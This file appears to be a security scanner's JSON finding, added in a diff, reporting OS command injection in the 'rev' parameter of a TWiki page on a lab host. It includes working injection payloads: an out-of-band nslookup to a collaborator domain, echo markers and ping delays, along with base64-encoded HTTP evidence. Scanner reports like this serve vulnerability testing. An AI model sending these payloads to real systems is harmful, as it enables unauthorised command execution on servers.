@@ -1,0 +1,174 @@
+{
+  "name": "OS command injection",
+  "type": "vulnerability",
+  "severity": "High",
+  "confidence": "Certain",
+  "host": "",
+  "path": "/twiki/bin/view/Main/WebHome",
+  "url": "/twiki/bin/view/Main/WebHome",
+  "evidence": [
+    {
+      "type": "CollaboratorEvidence",
+      "detail": {
+        "payload": {
+          "bytes": "fG5zbG9va3VwIC1xPWNuYW1lIGduN3BkdTNpb3RyYW1zZTVsNjRwOW40bDFjNzV5dHZtamk3OXV6aW8ub2FzdGlmeS5jb20uJg==",
+          "flags": 1
+        },
+        "band_flags": [
+          "out_of_band"
+        ]
+      },
+      "request_response": {
+        "url": "http://192.168.1.50/twiki/bin/view/Main/WebHome?rev=1.19%7cnslookup%20-q%3dcname%20gn7pdu3iotramse5l64p9n4l1c75ytvmji79uzio.oastify.com.%26",
+        "request": [
+          {
+            "type": "DataSegment",
+            "data": "R0VUIC90d2lraS9iaW4vdmlldy9NYWluL1dlYkhvbWU/cmV2PTEuMTk=",
+            "length": 41
+          },
+          {
+            "type": "HighlightSegment",
+            "data": "JTdjbnNsb29rdXAlMjAtcSUzZGNuYW1lJTIwZ243cGR1M2lvdHJhbXNlNWw2NHA5bjRsMWM3NXl0dm1qaTc5dXppby5vYXN0aWZ5LmNvbS4lMjY=",
+            "length": 83
+          },
+          {
+            "type": "DataSegment",
+            "data": "IEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjEuNTANCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KU2VjLUNILVVBOiAiR29vZ2xlIENocm9tZSI7dj0iMTM4IiwgIk5vdD1BP0JyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMzgiDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KU2VjLUNILVVBLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cDovLzE5Mi4xNjguMS41MC90d2lraS9iaW4vdmlldy9NYWluL1dlYkhvbWUNCg0K",
+            "length": 723
+          }
+        ],
+        "response": [
+          {
+            "type": "DataSegment",
+            "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUdWUsIDAyIFNlcCAyMDI1IDE2OjAzOjA3IEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjggKFVidW50dSkgREFWLzINCkNvbnRlbnQtTGVuZ3RoOiA0MTk4DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMQ0KDQo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiB4bWw6bGFuZz0iZW4iIGxhbmc9ImVuIj4gCjxoZWFkPgogPA==",
+            "length": 379
+          },
+          {
+            "type": "SnipSegment",
+            "length": 3998
+          }
+        ],
+        "was_redirect_followed": false,
+        "request_time": "1756828989209"
+      },
+      "dns_event": {
+        "query_type": 5,
+        "domain": "gn7pdu3iotramse5l64p9n4l1c75ytvmji79uzio.oastify.com",
+        "query": "FCYAAAABAAAAAAAAKGduN3BkdTNpb3RyYW1zZTVsNjRwOW40bDFjNzV5dHZtamk3OXV6aW8Hb2FzdGlmeQNjb20AAAUAAQ==",
+        "time_stamp": "2025-Sep-02 16:03:07.178 UTC",
+        "time_between_sending_payload_and_receiving_interaction": "0",
+        "source_ip_address": "105.73.34.103",
+        "source_port": 49678,
+        "type": "dns",
+        "interaction_id": "gn7pdu3iotramse5l64p9n4l1c75ytvmji79uzio",
+        "description": "The Collaborator server received a DNS lookup of type CNAME for the domain name <b>gn7pdu3iotramse5l64p9n4l1c75ytvmji79uzio.oastify.com</b>.<br><br> The lookup was received from IP address 105.73.34.103:49678 at 2025-Sep-02 16:03:07.178 UTC."
+      }
+    },
+    {
+      "type": "FirstOrderEvidence",
+      "detail": {
+        "payload": {
+          "bytes": "fGVjaG8gNDA2d2VjdGYxdCBvMDl4ZnF0cHhhfHxhICMnIHxlY2hvIDQwNndlY3RmMXQgbzA5eGZxdHB4YXx8YSAjfCIgfGVjaG8gNDA2d2VjdGYxdCBvMDl4ZnF0cHhhfHxhICM=",
+          "flags": 1
+        },
+        "band_flags": [
+          "in_band"
+        ]
+      },
+      "request_response": {
+        "url": "http://192.168.1.50/twiki/bin/view/Main/WebHome?rev=1.19%7cecho%20406wectf1t%20o09xfqtpxa%7c%7ca%20%23'%20%7cecho%20406wectf1t%20o09xfqtpxa%7c%7ca%20%23%7c%22%20%7cecho%20406wectf1t%20o09xfqtpxa%7c%7ca%20%23",
+        "request": [
+          {
+            "type": "DataSegment",
+            "data": "R0VUIC90d2lraS9iaW4vdmlldy9NYWluL1dlYkhvbWU/cmV2PTEuMTk=",
+            "length": 41
+          },
+          {
+            "type": "HighlightSegment",
+            "data": "JTdjZWNobyUyMDQwNndlY3RmMXQlMjBvMDl4ZnF0cHhhJTdjJTdjYSUyMCUyMyclMjAlN2NlY2hvJTIwNDA2d2VjdGYxdCUyMG8wOXhmcXRweGElN2MlN2NhJTIwJTIzJTdjJTIyJTIwJTdjZWNobyUyMDQwNndlY3RmMXQlMjBvMDl4ZnF0cHhhJTdjJTdjYSUyMCUyMw==",
+            "length": 151
+          },
+          {
+            "type": "DataSegment",
+            "data": "IEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjEuNTANCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KU2VjLUNILVVBOiAiR29vZ2xlIENocm9tZSI7dj0iMTM4IiwgIk5vdD1BP0JyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMzgiDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KU2VjLUNILVVBLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cDovLzE5Mi4xNjguMS41MC90d2lraS9iaW4vdmlldy9NYWluL1dlYkhvbWUNCkNvbnRlbnQtTGVuZ3RoOiAwDQoNCg==",
+            "length": 742
+          }
+        ],
+        "response": [
+          {
+            "type": "DataSegment",
+            "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUdWUsIDAyIFNlcCAyMDI1IDE1OjU2OjE1IEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjggKFVidW50dSkgREFWLzINCkNvbnRlbnQtTGVuZ3RoOiAzODQyDQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMQ0KDQo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiB4bWw6bGFuZz0iZW4iIGxhbmc9ImVuIj4gCjxoZWFkPgogPA==",
+            "length": 379
+          },
+          {
+            "type": "SnipSegment",
+            "length": 1818
+          },
+          {
+            "type": "DataSegment",
+            "data": "PC9mb3JtPgo=",
+            "length": 8
+          },
+          {
+            "type": "HighlightSegment",
+            "data": "NDA2d2VjdGYxdCBvMDl4ZnF0cHhh",
+            "length": 21
+          },
+          {
+            "type": "DataSegment",
+            "data": "CjxwIC8+",
+            "length": 6
+          },
+          {
+            "type": "SnipSegment",
+            "length": 1789
+          }
+        ],
+        "was_redirect_followed": false,
+        "request_time": "1756828683623"
+      }
+    },
+    {
+      "type": "TimingBasedEvidence",
+      "evidence": {
+        "type": "FirstOrderEvidence",
+        "detail": {
+          "payload": {
+            "bytes": "fHBpbmcgLW4gMjEgMTI3LjAuMC4xfHxgcGluZyAtYyAyMSAxMjcuMC4wLjFgICMnIHxwaW5nIC1uIDIxIDEyNy4wLjAuMXx8YHBpbmcgLWMgMjEgMTI3LjAuMC4xYCAjXCIgfHBpbmcgLW4gMjEgMTI3LjAuMC4x",
+            "flags": 17
+          },
+          "band_flags": [
+            "in_band"
+          ]
+        },
+        "request_response": {
+          "url": "http://192.168.1.50/twiki/bin/view/Main/WebHome?rev=1.19%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "R0VUIC90d2lraS9iaW4vdmlldy9NYWluL1dlYkhvbWU/cmV2PTEuMTk=",
+              "length": 41
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "JTdjcGluZyUyMC1uJTIwMjElMjAxMjcuMC4wLjElN2MlN2MlNjBwaW5nJTIwLWMlMjAyMSUyMDEyNy4wLjAuMSU2MCUyMCUyMyclMjAlN2NwaW5nJTIwLW4lMjAyMSUyMDEyNy4wLjAuMSU3YyU3YyU2MHBpbmclMjAtYyUyMDIxJTIwMTI3LjAuMC4xJTYwJTIwJTIzJTVjJTIyJTIwJTdjcGluZyUyMC1uJTIwMjElMjAxMjcuMC4wLjE=",
+              "length": 188
+            },
+            {
+              "type": "DataSegment",
+              "data": "IEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjEuNTANCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KU2VjLUNILVVBOiAiR29vZ2xlIENocm9tZSI7dj0iMTM4IiwgIk5vdD1BP0JyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMzgiDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KU2VjLUNILVVBLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cDovLzE5Mi4xNjguMS41MC90d2lraS9iaW4vdmlldy9NYWluL1dlYkhvbWUNCkNvbnRlbnQtTGVuZ3RoOiAwDQoNCg==",
+              "length": 742
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "1756828683623"
+        }
+      },
+      "orig_response_completed_timer": "559",
+      "attack_response_completed_timer": "0"
+    }
+  ],
+  "description": "The <b>rev</b> parameter appears to be vulnerable to OS command injection attacks. It is possible to use various shell metacharacters to inject arbitrary OS commands and retrieve the output in the application's responses. Additionally it is possible to inject time delay commands to verify the existence of the vulnerability. It is also possible to cause the application to interact with an external domain, to verify that a command was executed.<br><br>The payload <b>|nslookup -q=cname gn7pdu3iotramse5l64p9n4l1c75ytvmji79uzio.oastify.com.&amp;</b> was submitted in the rev parameter. The application performed a DNS lookup for the specified domain name.<br><br>Additionally, the payload <b>|echo 406wectf1t o09xfqtpxa||a #' |echo 406wectf1t o09xfqtpxa||a #|\" |echo 406wectf1t o09xfqtpxa||a #</b> was submitted in the rev parameter. The application's response appears to contain the output from the injected command, indicating that the command was executed.<br><br>Additionally, the payload <b>|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1</b> was submitted in the rev parameter. The application timed out when responding to the request, indicating that the injected command caused a time delay.",
+  "remediation": "",
+  "references": []
+}
